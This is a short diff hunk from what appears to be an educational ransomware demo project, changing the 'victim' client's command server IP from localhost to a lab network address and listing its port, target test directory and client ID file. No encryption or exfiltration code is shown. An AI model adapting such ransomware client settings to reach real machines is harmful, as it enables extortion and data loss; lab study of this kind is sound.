@@ -4,7 +4,7 @@ import RSA_algorithm
 
 
 #setup configure for victim
-SERVER_IP = "127.0.0.1"
+SERVER_IP = "192.168.56.1"
 SERVER_PORT = 6967
 TARGET_DIR = "/home/k4k/vscode/safe-ransomware-crypto-demo/src/testing_env"
 CLIENT_ID_FILE = ".client_uuid"
